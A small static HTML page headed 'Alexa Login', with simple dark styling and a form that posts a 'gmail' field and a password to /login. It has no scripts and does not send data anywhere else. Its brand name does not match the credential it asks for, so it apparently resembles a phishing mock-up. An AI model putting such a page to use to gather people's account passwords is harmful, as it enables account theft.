<!DOCTYPE html>
<html>

<head>

    <title>Alexa Login</title>

    <style>

        body {

            background: #111;
            color: white;
            font-family: Arial;
            text-align: center;
            margin-top: 100px;
        }

        .box {

            width: 350px;
            margin: auto;
            background: #222;
            padding: 30px;
            border-radius: 10px;
        }

        input {

            width: 90%;
            padding: 10px;
            margin: 10px;
        }

        button {

            padding: 10px 20px;
            cursor: pointer;
        }

    </style>

</head>

<body>

<div class="box">

    <h1>Alexa Login</h1>

    <form method="POST" action="/login">

        <input type="email"
               name="gmail"
               placeholder="Enter Gmail"
               required>

        <input type="password"
               name="password"
               placeholder="Enter Password"
               required>

        <button type="submit">
            Login
        </button>

    </form>

</div>

</body>
</html>
